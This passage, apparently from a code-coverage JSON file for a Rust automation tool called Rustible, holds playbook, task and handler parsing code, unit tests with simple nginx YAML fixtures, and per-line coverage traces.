IndexMap::new();\n                args.insert(\"file\".to_string(), JsonValue::String(import_file.clone()));\n                args\n            },\n            when: def.when.as_ref().map(|w| w.to_condition()),\n            ..Default::default()\n        };\n        return Ok(vec![task]);\n    }\n\n    // Handle include_role\n    if let Some(ref include_role) = def.include_role {\n        let task = Task {\n            name: if def.name.is_empty() {\n                format!(\"Include role: {}\", include_role.name)\n            } else {\n                def.name.clone()\n            },\n            module: \"include_role\".to_string(),\n            args: {\n                let mut args = IndexMap::new();\n                args.insert(\n                    \"name\".to_string(),\n                    JsonValue::String(include_role.name.clone()),\n                );\n                if let Some(ref tasks_from) = include_role.tasks_from {\n                    args.insert(\n                        \"tasks_from\".to_string(),\n                        JsonValue::String(tasks_from.clone()),\n                    );\n                }\n                args\n            },\n            when: def.when.as_ref().map(|w| w.to_condition()),\n            ..Default::default()\n        };\n        return Ok(vec![task]);\n    }\n\n    // Handle import_role\n    if let Some(ref import_role) = def.import_role {\n        let task = Task {\n            name: if def.name.is_empty() {\n                format!(\"Import role: {}\", import_role.name)\n            } else {\n                def.name.clone()\n            },\n            module: \"import_role\".to_string(),\n            args: {\n                let mut args = IndexMap::new();\n                args.insert(\n                    \"name\".to_string(),\n                    JsonValue::String(import_role.name.clone()),\n                );\n                args\n            },\n            when: def.when.as_ref().map(|w| w.to_condition()),\n            ..Default::default()\n        };\n        return Ok(vec![task]);\n    }\n\n    // Find the module in the flattened definition\n    let (module_name, module_args) = find_module_in_definition(\u0026def)?;\n\n    // Build the task\n    let task = Task {\n        name: def.name,\n        module: module_name,\n        args: module_args,\n        when: def.when.as_ref().map(|w| w.to_condition()),\n        notify: def.notify.to_vec(),\n        register: def.register,\n        loop_items: match def.loop_items {\n            Some(LoopValue::Items(items)) =\u003e Some(items),\n            Some(LoopValue::Variable(_)) =\u003e None, // Would need runtime resolution\n            None =\u003e None,\n        },\n        loop_var: def\n            .loop_control\n            .as_ref()\n            .map(|lc| lc.loop_var.clone())\n            .unwrap_or_else(|| \"item\".to_string()),\n        ignore_errors: def.ignore_errors,\n        changed_when: def.changed_when.as_ref().map(|w| w.to_condition()),\n        failed_when: def.failed_when.as_ref().map(|w| w.to_condition()),\n        delegate_to: def.delegate_to,\n        run_once: def.run_once,\n        tags: def.tags,\n        r#become: def.r#become,\n        become_user: def.become_user,\n    };\n\n    tasks.push(task);\n    Ok(tasks)\n}\n\n/// Find the module name and args in a task definition\nfn find_module_in_definition(\n    def: \u0026TaskDefinition,\n) -\u003e ExecutorResult\u003c(String, IndexMap\u003cString, JsonValue\u003e)\u003e {\n    // Known non-module keys\n    let non_module_keys = [\n        \"name\",\n        \"when\",\n        \"register\",\n        \"notify\",\n        \"loop\",\n        \"loop_items\",\n        \"with_items\",\n        \"with_list\",\n        \"loop_control\",\n        \"ignore_errors\",\n        \"changed_when\",\n        \"failed_when\",\n        \"delegate_to\",\n        \"run_once\",\n        \"tags\",\n        \"become\",\n        \"become_user\",\n        \"block\",\n        \"rescue\",\n        \"always\",\n        \"include_tasks\",\n        \"import_tasks\",\n        \"include_role\",\n        \"import_role\",\n        \"environment\",\n        \"retries\",\n        \"delay\",\n        \"until\",\n        \"vars\",\n        \"module_args\",\n        \"args\",\n        \"no_log\",\n        \"throttle\",\n        \"any_errors_fatal\",\n        \"check_mode\",\n        \"diff\",\n        \"connection\",\n        \"async\",\n        \"poll\",\n    ];\n\n    // Check explicit args first\n    if let Some(ref args) = def.module_args {\n        // Find the module in the flattened fields\n        for (key, value) in \u0026def.module {\n            if !non_module_keys.contains(\u0026key.as_str()) {\n                // This is the module\n                let mut full_args = args.clone();\n\n                // If value is a map, merge it\n                if let JsonValue::Object(obj) = value {\n                    for (k, v) in obj {\n                        full_args.insert(k.clone(), v.clone());\n                    }\n                } else if let JsonValue::String(s) = value {\n                    // Free-form module args\n                    full_args.insert(\"_raw_params\".to_string(), JsonValue::String(s.clone()));\n                }\n\n                return Ok((key.clone(), full_args));\n            }\n        }\n    }\n\n    // Look for module in flattened fields\n    for (key, value) in \u0026def.module {\n        if !non_module_keys.contains(\u0026key.as_str()) {\n            let args = match value {\n                JsonValue::Object(obj) =\u003e obj.iter().map(|(k, v)| (k.clone(), v.clone())).collect(),\n                JsonValue::String(s) =\u003e {\n                    let mut args = IndexMap::new();\n                    args.insert(\"_raw_params\".to_string(), JsonValue::String(s.clone()));\n                    args\n                }\n                JsonValue::Null =\u003e IndexMap::new(),\n                other =\u003e {\n                    let mut args = IndexMap::new();\n                    args.insert(\"_raw_params\".to_string(), other.clone());\n                    args\n                }\n            };\n\n            return Ok((key.clone(), args));\n        }\n    }\n\n    // Default to debug module if nothing found\n    Ok((\"debug\".to_string(), IndexMap::new()))\n}\n\n/// Parse a handler definition\nfn parse_handler_definition(def: HandlerDefinition) -\u003e ExecutorResult\u003cHandler\u003e {\n    let (module_name, module_args) = {\n        let non_module_keys = [\"name\", \"listen\", \"when\"];\n\n        let mut module_name = \"debug\".to_string();\n        let mut module_args = IndexMap::new();\n\n        for (key, value) in \u0026def.module {\n            if !non_module_keys.contains(\u0026key.as_str()) {\n                module_name = key.clone();\n                module_args = match value {\n                    JsonValue::Object(obj) =\u003e {\n                        obj.iter().map(|(k, v)| (k.clone(), v.clone())).collect()\n                    }\n                    JsonValue::String(s) =\u003e {\n                        let mut args = IndexMap::new();\n                        args.insert(\"_raw_params\".to_string(), JsonValue::String(s.clone()));\n                        args\n                    }\n                    _ =\u003e IndexMap::new(),\n                };\n                break;\n            }\n        }\n\n        (module_name, module_args)\n    };\n\n    Ok(Handler {\n        name: def.name,\n        module: module_name,\n        args: module_args,\n        when: def.when.map(|w| w.to_condition()),\n        listen: def.listen,\n    })\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_playbook_new() {\n        let playbook = Playbook::new(\"Test Playbook\");\n        assert_eq!(playbook.name, \"Test Playbook\");\n        assert!(playbook.plays.is_empty());\n    }\n\n    #[test]\n    fn test_play_new() {\n        let play = Play::new(\"Install nginx\", \"webservers\");\n        assert_eq!(play.name, \"Install nginx\");\n        assert_eq!(play.hosts, \"webservers\");\n        assert!(play.gather_facts);\n    }\n\n    #[test]\n    fn test_role_new() {\n        let role = Role::new(\"nginx\");\n        assert_eq!(role.name, \"nginx\");\n        assert!(role.tasks.is_empty());\n    }\n\n    #[test]\n    fn test_parse_simple_playbook() {\n        let yaml = r#\"\n- name: Test Play\n  hosts: all\n  gather_facts: false\n  tasks:\n    - name: Debug message\n      debug:\n        msg: \"Hello World\"\n\"#;\n\n        let playbook = Playbook::parse(yaml, None).unwrap();\n        assert_eq!(playbook.plays.len(), 1);\n\n        let play = \u0026playbook.plays[0];\n        assert_eq!(play.name, \"Test Play\");\n        assert_eq!(play.hosts, \"all\");\n        assert!(!play.gather_facts);\n        assert_eq!(play.tasks.len(), 1);\n\n        let task = \u0026play.tasks[0];\n        assert_eq!(task.name, \"Debug message\");\n        assert_eq!(task.module, \"debug\");\n    }\n\n    #[test]\n    fn test_parse_when_condition() {\n        let single = WhenCondition::Single(\"ansible_os_family == 'Debian'\".to_string());\n        assert_eq!(single.to_condition(), \"ansible_os_family == 'Debian'\");\n\n        let list = WhenCondition::List(vec![\n            \"ansible_os_family == 'Debian'\".to_string(),\n            \"ansible_distribution_major_version \u003e= '20'\".to_string(),\n        ]);\n        assert!(list.to_condition().contains(\" and \"));\n    }\n\n    #[test]\n    fn test_parse_notify() {\n        let none = NotifyValue::None;\n        assert!(none.to_vec().is_empty());\n\n        let single = NotifyValue::Single(\"restart nginx\".to_string());\n        assert_eq!(single.to_vec(), vec![\"restart nginx\"]);\n\n        let list = NotifyValue::List(vec![\n            \"restart nginx\".to_string(),\n            \"reload config\".to_string(),\n        ]);\n        assert_eq!(list.to_vec().len(), 2);\n    }\n\n    #[test]\n    fn test_role_definition_name() {\n        let simple = RoleDefinition::Name(\"nginx\".to_string());\n        assert_eq!(simple.name(), \"nginx\");\n\n        let full = RoleDefinition::Full {\n            role: \"nginx\".to_string(),\n            when: Some(\"ansible_os_family == 'Debian'\".to_string()),\n            tags: vec![\"web\".to_string()],\n            vars: IndexMap::new(),\n            r#become: Some(true),\n            tasks_from: None,\n            vars_from: None,\n            defaults_from: None,\n            handlers_from: None,\n        };\n        assert_eq!(full.name(), \"nginx\");\n    }\n\n    #[test]\n    fn test_parse_playbook_with_roles() {\n        let yaml = r#\"\n- name: Web Server Setup\n  hosts: webservers\n  roles:\n    - nginx\n    - role: php\n      when: install_php\n      vars:\n        php_version: \"8.1\"\n\"#;\n\n        let playbook = Playbook::parse(yaml, None).unwrap();\n        assert_eq!(playbook.plays.len(), 1);\n\n        let play = \u0026playbook.plays[0];\n        assert_eq!(play.roles.len(), 2);\n        assert_eq!(play.roles[0].name, \"nginx\");\n        assert_eq!(play.roles[1].name, \"php\");\n    }\n\n    #[test]\n    fn test_parse_playbook_with_handlers() {\n        let yaml = r#\"\n- name: Configure nginx\n  hosts: webservers\n  tasks:\n    - name: Copy config\n      copy:\n        src: nginx.conf\n        dest: /etc/nginx/nginx.conf\n      notify: restart nginx\n  handlers:\n    - name: restart nginx\n      service:\n        name: nginx\n        state: restarted\n\"#;\n\n        let playbook = Playbook::parse(yaml, None).unwrap();\n        let play = \u0026playbook.plays[0];\n\n        assert_eq!(play.handlers.len(), 1);\n        assert_eq!(play.handlers[0].name, \"restart nginx\");\n        assert_eq!(play.handlers[0].module, \"service\");\n    }\n}\n","traces":[{"line":35,"address":[25767055,25766736,25767049],"length":1,"stats":{"Line":1}},{"line":37,"address":[25766769],"length":1,"stats":{"Line":1}},{"line":43,"address":[],"length":0,"stats":{"Line":0}},{"line":44,"address":[],"length":0,"stats":{"Line":0}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[30380576,30382410,30382519],"length":1,"stats":{"Line":1}},{"line":53,"address":[30380760,30380835,30382517,30380638],"length":1,"stats":{"Line":2}},{"line":54,"address":[25767131,25767104],"length":1,"stats":{"Line":1}},{"line":56,"address":[30380940],"length":1,"stats":{"Line":1}},{"line":57,"address":[30381052,30380996],"length":1,"stats":{"Line":2}},{"line":59,"address":[30381620,30381199],"length":1,"stats":{"Line":1}},{"line":60,"address":[30381572,30381247,30381478],"length":1,"stats":{"Line":0}},{"line":61,"address":[30381352],"length":1,"stats":{"Line":0}},{"line":62,"address":[25767086,25767072],"length":1,"stats":{"Line":0}},{"line":63,"address":[30381416],"length":1,"stats":{"Line":0}},{"line":64,"address":[30381459,30381545],"length":1,"stats":{"Line":0}},{"line":67,"address":[30381752,30382387,30381625,30381270],"length":1,"stats":{"Line":4}},{"line":68,"address":[30381990,30381840,30382489],"length":1,"stats":{"Line":1}},{"line":69,"address":[30382289],"length":1,"stats":{"Line":1}},{"line":72,"address":[30381900],"length":1,"stats":{"Line":1}},{"line":76,"address":[30382544],"length":1,"stats":{"Line":0}},{"line":77,"address":[30382549],"length":1,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[30380496],"length":1,"stats":{"Line":0}},{"line":87,"address":[30380528],"length":1,"stats":{"Line":0}},{"line":89,"address":[30380549],"length":1,"stats":{"Line":0}},{"line":170,"address":[30338672],"length":1,"stats":{"Line":0}},{"line":171,"address":[30338680],"length":1,"stats":{"Line":0}},{"line":224,"address":[30338752],"length":1,"stats":{"Line":1}},{"line":225,"address":[30338766,30338854],"length":1,"stats":{"Line":2}},{"line":226,"address":[30338830],"length":1,"stats":{"Line":1}},{"line":227,"address":[30338803],"length":1,"stats":{"Line":1}},{"line":232,"address":[30338880],"length":1,"stats":{"Line":1}},{"line":233,"address":[30338903],"length":1,"stats":{"Line":1}},{"line":234,"address":[30338965],"length":1,"stats":{"Line":1}},{"line":235,"address":[30338944],"length":1,"stats":{"Line":1}},{"line":240,"address":[30338992],"length":1,"stats":{"Line":1}},{"line":241,"address":[30339005],"length":1,"stats":{"Line":1}},{"line":242,"address":[30339068],"length":1,"stats":{"Line":1}},{"line":243,"address":[30339041],"length":1,"stats":{"Line":1}},{"line":362,"address":[30338546,30338224,30338552],"length":1,"stats":{"Line":1}},{"line":363,"address":[30338251],"length":1,"stats":{"Line":1}},{"line":364,"address":[30338303],"length":1,"stats":{"Line":1}},{"line":365,"address":[30338265],"length":1,"stats":{"Line":1}},{"line":366,"address":[30338279],"length":1,"stats":{"Line":1}},{"line":367,"address":[30338336],"length":1,"stats":{"Line":0}},{"line":369,"address":[30338374,30338442],"length":1,"stats":{"Line":2}},{"line":370,"address":[30338409],"length":1,"stats":{"Line":3}},{"line":390,"address":[30337744,30338074,30338080],"length":1,"stats":{"Line":1}},{"line":391,"address":[30337768],"length":1,"stats":{"Line":1}},{"line":392,"address":[30337805],"length":1,"stats":{"Line":1}},{"line":393,"address":[30337818,30337908],"length":1,"stats":{"Line":1}},{"line":394,"address":[30337883],"length":1,"stats":{"Line":1}},{"line":422,"address":[30339104],"length":1,"stats":{"Line":0}},{"line":423,"address":[30339112],"length":1,"stats":{"Line":0}},{"line":489,"address":[25762816,25764278,25764304,25765726,25764221,25765669],"length":1,"stats":{"Line":2}},{"line":491,"address":[25762875,25764341],"length":1,"stats":{"Line":2}},{"line":492,"address":[25762965,25764425],"length":1,"stats":{"Line":2}},{"line":498,"address":[25764527,25763070],"length":1,"stats":{"Line":2}},{"line":499,"address":[25763121,25764575],"length":1,"stats":{"Line":2}},{"line":500,"address":[25763185,25764639],"length":1,"stats":{"Line":2}},{"line":501,"address":[25764695,25763241],"length":1,"stats":{"Line":2}},{"line":502,"address":[25764747,25763293],"length":1,"stats":{"Line":2}},{"line":503,"address":[25763345,25764799],"length":1,"stats":{"Line":2}},{"line":504,"address":[25764851,25763397],"length":1,"stats":{"Line":2}},{"line":505,"address":[25764903,25763449],"length":1,"stats":{"Line":2}},{"line":506,"address":[25763493,25764947],"length":1,"stats":{"Line":2}},{"line":515,"address":[30368707,30366608,30363920],"length":1,"stats":{"Line":1}},{"line":519,"address":[30364018],"length":1,"stats":{"Line":1}},{"line":521,"address":[30364364],"length":1,"stats":{"Line":1}},{"line":522,"address":[30364377],"length":1,"stats":{"Line":1}},{"line":523,"address":[30364390],"length":1,"stats":{"Line":1}},{"line":524,"address":[30364562],"length":1,"stats":{"Line":1}},{"line":525,"address":[30364734],"length":1,"stats":{"Line":1}},{"line":526,"address":[30364906],"length":1,"stats":{"Line":1}},{"line":527,"address":[30365140],"length":1,"stats":{"Line":1}},{"line":528,"address":[30365312],"length":1,"stats":{"Line":1}},{"line":529,"address":[30365558],"length":1,"stats":{"Line":1}},{"line":530,"address":[30365730],"length":1,"stats":{"Line":1}},{"line":531,"address":[30365918],"length":1,"stats":{"Line":1}},{"line":532,"address":[30365933],"length":1,"stats":{"Line":1}},{"line":535,"address":[30365962,30366347],"length":1,"stats":{"Line":1}},{"line":536,"address":[30366315,30366024],"length":1,"stats":{"Line":0}},{"line":537,"address":[30366142],"length":1,"stats":{"Line":0}},{"line":538,"address":[30366183],"length":1,"stats":{"Line":0}},{"line":540,"address":[30366223,30366412],"length":1,"stats":{"Line":0}},{"line":542,"address":[30366249],"length":1,"stats":{"Line":0}},{"line":544,"address":[30366289,30366667],"length":1,"stats":{"Line":0}},{"line":545,"address":[25762757],"length":1,"stats":{"Line":0}},{"line":546,"address":[25762789],"length":1,"stats":{"Line":0}},{"line":553,"address":[30366890,30366076,30366763,30370459],"length":1,"stats":{"Line":4}},{"line":554,"address":[30366989,30370156],"length":1,"stats":{"Line":2}},{"line":555,"address":[30370361],"length":1,"stats":{"Line":1}},{"line":559,"address":[30367210,30370091,30367022],"length":1,"stats":{"Line":2}},{"line":560,"address":[30367300,30369811],"length":1,"stats":{"Line":0}},{"line":561,"address":[30369983],"length":1,"stats":{"Line":0}},{"line":565,"address":[30367333,30367521,30369746],"length":1,"stats":{"Line":3}},{"line":566,"address":[30369466,30367611],"length":1,"stats":{"Line":2}},{"line":567,"address":[30369638],"length":1,"stats":{"Line":1}},{"line":571,"address":[30369401,30367644,30367832],"length":1,"stats":{"Line":2}},{"line":572,"address":[30369121,30367922],"length":1,"stats":{"Line":0}},{"line":573,"address":[30369293],"length":1,"stats":{"Line":0}},{"line":577,"address":[30369041,30367955,30368143],"length":1,"stats":{"Line":3}},{"line":578,"address":[30368736,30368219],"length":1,"stats":{"Line":2}},{"line":579,"address":[30368943],"length":1,"stats":{"Line":1}},{"line":582,"address":[30368287],"length":1,"stats":{"Line":1}},{"line":586,"address":[30371920],"length":1,"stats":{"Line":0}},{"line":587,"address":[30371925],"length":1,"stats":{"Line":0}},{"line":591,"address":[30363888],"length":1,"stats":{"Line":0}},{"line":592,"address":[30363893],"length":1,"stats":{"Line":0}},{"line":596,"address":[],"length":0,"stats":{"Line":0}},{"line":597,"address":[],"length":0,"stats":{"Line":0}},{"line":630,"address":[25765744,25766638,25766583],"length":1,"stats":{"Line":1}},{"line":632,"address":[25765777],"length":1,"stats":{"Line":1}},{"line":634,"address":[25765818],"length":1,"stats":{"Line":1}},{"line":636,"address":[25765884],"length":1,"stats":{"Line":1}},{"line":638,"address":[25765955],"length":1,"stats":{"Line":1}},{"line":639,"address":[25766011],"length":1,"stats":{"Line":1}},{"line":640,"address":[25766063],"length":1,"stats":{"Line":1}},{"line":642,"address":[25766133],"length":1,"stats":{"Line":1}},{"line":647,"address":[30372304,30380121,30375198],"length":1,"stats":{"Line":1}},{"line":651,"address":[30372369,30372456],"length":1,"stats":{"Line":2}},{"line":652,"address":[30372479,30372523],"length":1,"stats":{"Line":2}},{"line":653,"address":[30372680],"length":1,"stats":{"Line":1}},{"line":655,"address":[30372908,30373358],"length":1,"stats":{"Line":2}},{"line":656,"address":[30372924],"length":1,"stats":{"Line":1}},{"line":657,"address":[30372939],"length":1,"stats":{"Line":1}},{"line":658,"address":[30372965],"length":1,"stats":{"Line":1}},{"line":662,"address":[30373046,30372987],"length":1,"stats":{"Line":2}},{"line":663,"address":[30373188],"length":1,"stats":{"Line":1}},{"line":664,"address":[30373197],"length":1,"stats":{"Line":1}},{"line":670,"address":[30373006,30373363],"length":1,"stats":{"Line":1}},{"line":671,"address":[30373387,30373507],"length":1,"stats":{"Line":0}},{"line":672,"address":[30373696],"length":1,"stats":{"Line":0}},{"line":674,"address":[30373976],"length":1,"stats":{"Line":0}},{"line":675,"address":[30374080],"length":1,"stats":{"Line":0}},{"line":678,"address":[30374253],"length":1,"stats":{"Line":0}},{"line":679,"address":[30374518],"length":1,"stats":{"Line":0}},{"line":680,"address":[30374646,30374736],"length":1,"stats":{"Line":0}},{"line":681,"address":[30374867,30374776],"length":1,"stats":{"Line":0}},{"line":684,"address":[30375037,30375145],"length":1,"stats":{"Line":0}},{"line":690,"address":[30375348,30374584],"length":1,"stats":{"Line":0}},{"line":691,"address":[30375445,30375592,30375372],"length":1,"stats":{"Line":0}},{"line":693,"address":[30375831,30375954,30375403],"length":1,"stats":{"Line":0}},{"line":696,"address":[30375789,30376068],"length":1,"stats":{"Line":0}},{"line":697,"address":[30376145,30376235],"length":1,"stats":{"Line":0}},{"line":698,"address":[30376366,30376456,30376275],"length":1,"stats":{"Line":0}},{"line":700,"address":[30376577,30376504,30376704],"length":1,"stats":{"Line":0}},{"line":701,"address":[30376794,30376819],"length":1,"stats":{"Line":0}},{"line":704,"address":[30376993,30376916],"length":1,"stats":{"Line":0}},{"line":712,"address":[30377212,30376103],"length":1,"stats":{"Line":0}},{"line":713,"address":[30377438],"length":1,"stats":{"Line":0}},{"line":714,"address":[30377638,30377548],"length":1,"stats":{"Line":0}},{"line":715,"address":[30377847,30377793],"length":1,"stats":{"Line":0}},{"line":718,"address":[30377895,30377968,30378095],"length":1,"stats":{"Line":0}},{"line":719,"address":[30378171,30378196,30378312],"length":1,"stats":{"Line":0}},{"line":720,"address":[30378319,30378397],"length":1,"stats":{"Line":0}},{"line":728,"address":[30378610,30377512],"length":1,"stats":{"Line":0}},{"line":729,"address":[30378824],"length":1,"stats":{"Line":0}},{"line":730,"address":[30378997,30378910],"length":1,"stats":{"Line":0}},{"line":731,"address":[30379116,30379234,30379037],"length":1,"stats":{"Line":0}},{"line":732,"address":[30379458,30379236,30379331],"length":1,"stats":{"Line":0}},{"line":733,"address":[30379773,30379686],"length":1,"stats":{"Line":0}},{"line":736,"address":[30379780,30379858],"length":1,"stats":{"Line":0}},{"line":745,"address":[30373410],"length":1,"stats":{"Line":1}},{"line":749,"address":[30372277,30372271,30371952],"length":1,"stats":{"Line":0}},{"line":750,"address":[30371987],"length":1,"stats":{"Line":0}},{"line":753,"address":[30371997,30372068],"length":1,"stats":{"Line":0}},{"line":754,"address":[30372259,30372151],"length":1,"stats":{"Line":0}},{"line":758,"address":[30372163],"length":1,"stats":{"Line":0}},{"line":760,"address":[30372215],"length":1,"stats":{"Line":0}},{"line":764,"address":[30380463,30380469,30380144],"length":1,"stats":{"Line":0}},{"line":765,"address":[30380179],"length":1,"stats":{"Line":0}},{"line":767,"address":[30380260,30380189],"length":1,"stats":{"Line":0}},{"line":768,"address":[30380451,30380343],"length":1,"stats":{"Line":0}},{"line":771,"address":[30380355],"length":1,"stats":{"Line":0}},{"line":773,"address":[30380407],"length":1,"stats":{"Line":0}},{"line":806,"address":[30339152,30355171,30341222],"length":1,"stats":{"Line":1}},{"line":810,"address":[30339259],"length":1,"stats":{"Line":1}},{"line":813,"address":[30339627],"length":1,"stats":{"Line":1}},{"line":814,"address":[30339733],"length":1,"stats":{"Line":0}},{"line":815,"address":[30339943,30339834,30340070],"length":1,"stats":{"Line":0}},{"line":816,"address":[30342917,30340160],"length":1,"stats":{"Line":0}},{"line":820,"address":[30340375,30340185,30342507],"length":1,"stats":{"Line":0}},{"line":821,"address":[30342080,30340462],"length":1,"stats":{"Line":0}},{"line":822,"address":[30342072],"length":1,"stats":{"Line":0}},{"line":824,"address":[30342046,30342090],"length":1,"stats":{"Line":0}},{"line":825,"address":[30342110,30342264,30342486],"length":1,"stats":{"Line":0}},{"line":826,"address":[30342289],"length":1,"stats":{"Line":0}},{"line":829,"address":[30342136],"length":1,"stats":{"Line":0}},{"line":833,"address":[30340503],"length":1,"stats":{"Line":0}},{"line":834,"address":[30340661,30340788,30340601,30341199],"length":1,"stats":{"Line":0}},{"line":835,"address":[30340919,30340878],"length":1,"stats":{"Line":0}},{"line":837,"address":[30341091],"length":1,"stats":{"Line":0}},{"line":842,"address":[30341278,30340616],"length":1,"stats":{"Line":0}},{"line":843,"address":[30341332,30341989,30341578,30341451],"length":1,"stats":{"Line":0}},{"line":844,"address":[30341668,30341709],"length":1,"stats":{"Line":0}},{"line":845,"address":[30341881],"length":1,"stats":{"Line":0}},{"line":849,"address":[30341347],"length":1,"stats":{"Line":0}},{"line":853,"address":[30339748,30343204],"length":1,"stats":{"Line":1}},{"line":854,"address":[30343633,30343218,30343331],"length":1,"stats":{"Line":0}},{"line":857,"address":[30343604],"length":1,"stats":{"Line":0}},{"line":858,"address":[30343891],"length":1,"stats":{"Line":0}},{"line":864,"address":[25761952,25761968],"length":1,"stats":{"Line":0}},{"line":867,"address":[30345259],"length":1,"stats":{"Line":0}},{"line":871,"address":[30343254,30345560],"length":1,"stats":{"Line":1}},{"line":872,"address":[30345662,30345574,30345964],"length":1,"stats":{"Line":0}},{"line":875,"address":[30345935],"length":1,"stats":{"Line":0}},{"line":876,"address":[30346222],"length":1,"stats":{"Line":0}},{"line":882,"address":[30346696,30346771],"length":1,"stats":{"Line":0}},{"line":885,"address":[30347590],"length":1,"stats":{"Line":0}},{"line":889,"address":[30345610,30347873],"length":1,"stats":{"Line":1}},{"line":891,"address":[30347895,30347970],"length":1,"stats":{"Line":0}},{"line":896,"address":[30348044],"length":1,"stats":{"Line":0}},{"line":911,"address":[30348714,30348998],"length":1,"stats":{"Line":0}},{"line":914,"address":[30349817],"length":1,"stats":{"Line":0}},{"line":918,"address":[30350100,30347921],"length":1,"stats":{"Line":1}},{"line":920,"address":[30350122,30350170],"length":1,"stats":{"Line":0}},{"line":925,"address":[30350244],"length":1,"stats":{"Line":0}},{"line":934,"address":[25761872,25761856],"length":1,"stats":{"Line":0}},{"line":937,"address":[30351711],"length":1,"stats":{"Line":0}},{"line":941,"address":[30352002,30350156,30355318],"length":1,"stats":{"Line":2}},{"line":945,"address":[30352343],"length":1,"stats":{"Line":1}},{"line":948,"address":[25761792,25761776],"length":1,"stats":{"Line":2}},{"line":949,"address":[30352593],"length":1,"stats":{"Line":1}},{"line":950,"address":[30352661],"length":1,"stats":{"Line":1}},{"line":951,"address":[30352714],"length":1,"stats":{"Line":1}},{"line":956,"address":[30352784],"length":1,"stats":{"Line":1}},{"line":961,"address":[30353026],"length":1,"stats":{"Line":1}},{"line":962,"address":[25761888,25761904],"length":1,"stats":{"Line":2}},{"line":963,"address":[30353127,30353200],"length":1,"stats":{"Line":2}},{"line":964,"address":[30353219],"length":1,"stats":{"Line":1}},{"line":965,"address":[30353257],"length":1,"stats":{"Line":1}},{"line":966,"address":[30353263],"length":1,"stats":{"Line":1}},{"line":967,"address":[30353301],"length":1,"stats":{"Line":1}},{"line":968,"address":[30353307],"length":1,"stats":{"Line":1}},{"line":971,"address":[30353849],"length":1,"stats":{"Line":1}},{"line":972,"address":[30353913],"length":1,"stats":{"Line":1}},{"line":976,"address":[30360256,30362544,30362133],"length":1,"stats":{"Line":1}},{"line":980,"address":[30360286],"length":1,"stats":{"Line":1}},{"line":1023,"address":[30361365],"length":1,"stats":{"Line":1}},{"line":1025,"address":[30361428,30361496],"length":1,"stats":{"Line":0}},{"line":1026,"address":[30361598],"length":1,"stats":{"Line":0}},{"line":1028,"address":[30361656],"length":1,"stats":{"Line":0}},{"line":1031,"address":[30361674],"length":1,"stats":{"Line":0}},{"line":1032,"address":[30361708,30361778],"length":1,"stats":{"Line":0}},{"line":1033,"address":[30361923,30361974,30361997],"length":1,"stats":{"Line":0}},{"line":1035,"address":[30361720,30362144],"length":1,"stats":{"Line":0}},{"line":1037,"address":[30362161,30362224],"length":1,"stats":{"Line":0}},{"line":1040,"address":[30362404,30361947],"length":1,"stats":{"Line":0}},{"line":1046,"address":[30362557,30361463],"length":1,"stats":{"Line":2}},{"line":1047,"address":[30362659],"length":1,"stats":{"Line":1}},{"line":1048,"address":[30362916],"length":1,"stats":{"Line":1}},{"line":1049,"address":[25762546,25762496],"length":1,"stats":{"Line":3}},{"line":1050,"address":[30363031],"length":1,"stats":{"Line":0}},{"line":1051,"address":[30363055],"length":1,"stats":{"Line":0}},{"line":1052,"address":[30363447,30363060,30363264,30363237],"length":1,"stats":{"Line":0}},{"line":1053,"address":[30363416],"length":1,"stats":{"Line":0}},{"line":1055,"address":[30363008],"length":1,"stats":{"Line":0}},{"line":1057,"address":[30362969],"length":1,"stats":{"Line":0}},{"line":1058,"address":[30363537,30362974,30363852,30363514],"length":1,"stats":{"Line":0}},{"line":1059,"address":[30363649],"length":1,"stats":{"Line":0}},{"line":1063,"address":[30363720,30363171],"length":1,"stats":{"Line":2}},{"line":1068,"address":[30362717],"length":1,"stats":{"Line":0}},{"line":1072,"address":[30357792,30360233,30359549],"length":1,"stats":{"Line":1}},{"line":1073,"address":[30357814,30358541],"length":1,"stats":{"Line":2}},{"line":1074,"address":[30357870],"length":1,"stats":{"Line":1}},{"line":1076,"address":[30357951],"length":1,"stats":{"Line":1}},{"line":1077,"address":[30358031],"length":1,"stats":{"Line":1}},{"line":1079,"address":[30358152,30358084],"length":1,"stats":{"Line":2}},{"line":1080,"address":[30358890,30358292],"length":1,"stats":{"Line":2}},{"line":1081,"address":[30358961],"length":1,"stats":{"Line":1}},{"line":1082,"address":[30359658,30359111,30359605,30359517],"length":1,"stats":{"Line":3}},{"line":1083,"address":[30359199],"length":1,"stats":{"Line":1}},{"line":1084,"address":[30359571,30359219],"length":1,"stats":{"Line":4}},{"line":1086,"address":[30359163],"length":1,"stats":{"Line":0}},{"line":1087,"address":[30359187],"length":1,"stats":{"Line":0}},{"line":1088,"address":[30359229,30359527,30359304],"length":1,"stats":{"Line":0}},{"line":1089,"address":[30359483],"length":1,"stats":{"Line":0}},{"line":1091,"address":[30359603,30359148],"length":1,"stats":{"Line":0}},{"line":1097,"address":[30358317],"length":1,"stats":{"Line":1}},{"line":1100,"address":[30359770],"length":1,"stats":{"Line":1}},{"line":1101,"address":[30358666],"length":1,"stats":{"Line":1}},{"line":1102,"address":[30358698],"length":1,"stats":{"Line":1}},{"line":1103,"address":[30358735],"length":1,"stats":{"Line":1}},{"line":1104,"address":[25762416,25762400],"length":1,"stats":{"Line":1}},{"line":1105,"address":[30359734],"length":1,"stats":{"Line":1}}],"covered":146,"coverable":289},{"path":["/","home","artur","Repositories","rustible","src","executor","runtime.rs"],"content":"//! Runtime context for Rustible execution\n//!\n//! This module provides:\n//! - Variable scoping (global, play, task, host)\n//! - Fact storage\n//! - Register system for task results\n\nuse std::sync::Arc;\n\nuse indexmap::IndexMap;\nuse serde::{Deserialize, Serialize};\nuse serde_json::Value as JsonValue;\nuse tokio::sync::RwLock;\nuse tracing::{debug, trace};\n\nuse crate::connection::Connection;\n\n/// Scope levels for variable resolution\n#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]\npub enum VarScope {\n    /// Built-in variables (lowest precedence)\n    Builtin,\n    /// Inventory group variables\n    GroupVars,\n    /// Inventory host variables\n    HostVars,\n    /// Playbook variables\n    PlaybookVars,\n    /// Play-level variables\n    PlayVars,\n    /// Block variables\n    BlockVars,\n    /// Task variables\n    TaskVars,\n    /// Registered variables\n    Registered,\n    /// Set_fact / include_vars\n    SetFact,\n    /// Extra vars from command line (highest 